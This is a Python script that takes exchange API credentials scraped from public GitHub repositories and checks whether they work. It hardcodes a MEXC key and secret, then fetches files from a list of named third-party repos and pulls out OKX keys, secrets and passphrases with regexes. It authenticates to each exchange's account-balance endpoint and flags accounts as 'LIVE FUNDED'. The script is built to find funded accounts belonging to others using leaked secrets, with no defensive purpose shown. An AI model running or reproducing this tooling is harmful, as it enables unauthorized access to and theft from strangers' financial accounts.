#!/usr/bin/env python3
"""Check MEXC and OKX keys from findings."""
import urllib.request, urllib.error, json, re, hmac, hashlib, time, glob, base64

def get_raw(url):
    raw = url.replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
    try:
        r = urllib.request.urlopen(
            urllib.request.Request(raw, headers={'User-Agent': 'curl/7.0'}), timeout=10)
        return r.read().decode('utf-8', errors='replace')
    except:
        return ''

# ── MEXC ─────────────────────────────────────────────────────────────────────
k = 'mx0vglVqGbVvPdUbKs'
s = 'a4a8ac7f966d44c196891cb3f97f2e21'
ts = str(int(time.time() * 1000))
qs = 'timestamp=' + ts
sig = hmac.new(s.encode(), qs.encode(), hashlib.sha256).hexdigest()
print('=== MEXC ===')
try:
    req = urllib.request.Request(
        'https://api.mexc.com/api/v3/account?' + qs + '&signature=' + sig,
        headers={'X-MEXC-APIKEY': k, 'User-Agent': 'curl/7.0'})
    data = json.loads(urllib.request.urlopen(req, timeout=10).read())
    bals = [b for b in data.get('balances', []) if float(b.get('free', 0)) > 0.001]
    if bals:
        print('MEXC LIVE FUNDED:')
        for b in bals[:5]:
            print(' ', b.get('asset'), b.get('free'))
    else:
        print('MEXC LIVE but empty')
except urllib.error.HTTPError as ex:
    body = ex.read().decode()
    print('MEXC ERROR:', ex.code, body[:120])
except Exception as ex:
    print('MEXC ERR:', ex)

print()
print('=== OKX (re-fetching for passphrase) ===')
OKX_REPOS = [
    'jc-hello/okx-noliquid',
    'osman-akkawi/tradingbot',
    'kwannz/bull',
    'lightelementer/TradingBot',
    'yuchenxuuu/grid_bot',
    'sqfzy/ephemera',
    'edomasig/trading-bot',
    'Drehalas/BondCreditXLayer',
    'zkLinkProtocol/zklink-intent-url',
    'dssdfsdf2312/mentix',
]

OKX_K_RE = re.compile(r'OKX_(?:API_KEY|ACCESS_KEY|SIGNER_API_KEY)\s*[=:\s"\']+([a-f0-9A-F\-]{30,})', re.I)
OKX_S_RE = re.compile(r'OKX_SECRET_KEY\s*[=:\s"\']+([A-Za-z0-9]{20,})', re.I)
OKX_P_RE = re.compile(r'OKX_(?:PASSPHRASE|API_PASSPHRASE|PASS)\s*[=:\s"\']+([^\s"\'#]{4,30})', re.I)

seen = set()
for f in sorted(glob.glob('/opt/agents/gh_findings/*.jsonl')):
    for line in open(f):
        try:
            e = json.loads(line)
            if not any(r in e.get('repo', '') for r in OKX_REPOS):
                continue
            sig_key = e['repo'] + e['path']
            if sig_key in seen:
                continue
            seen.add(sig_key)

            content = get_raw(e['url'])
            time.sleep(0.2)
            km = OKX_K_RE.search(content)
            sm = OKX_S_RE.search(content)
            pm = OKX_P_RE.search(content)

            if km and sm and pm:
                k2, s2, p2 = km.group(1).strip(), sm.group(1).strip(), pm.group(1).strip()
                print('OKX+PASSPHRASE found:', e['repo'] + '/' + e['path'])
                ts2 = str(int(time.time()))
                msg = ts2 + 'GET' + '/api/v5/account/balance'
                sig2 = base64.b64encode(
                    hmac.new(s2.encode(), msg.encode(), hashlib.sha256).digest()).decode()
                try:
                    req2 = urllib.request.Request(
                        'https://www.okx.com/api/v5/account/balance',
                        headers={'OK-ACCESS-KEY': k2, 'OK-ACCESS-SIGN': sig2,
                                 'OK-ACCESS-TIMESTAMP': ts2, 'OK-ACCESS-PASSPHRASE': p2,
                                 'User-Agent': 'curl/7.0'})
                    data2 = json.loads(urllib.request.urlopen(req2, timeout=10).read())
                    if data2.get('code') == '0':
                        coins = []
                        for det in data2.get('data', [{}])[0].get('details', []):
                            if float(det.get('availBal', 0)) > 0.001:
                                coins.append(det['ccy'] + ':' + det['availBal'])
                        if coins:
                            print('*** OKX LIVE FUNDED ***:', coins)
                        else:
                            print('OKX LIVE but empty')
                    else:
                        print('OKX err:', data2.get('code'), data2.get('msg', '')[:60])
                except Exception as ex2:
                    print('OKX ERR:', str(ex2)[:80])
            elif km and sm:
                print('OKX no passphrase in:', e['repo'] + '/' + e['path'])
        except Exception as ex:
            pass
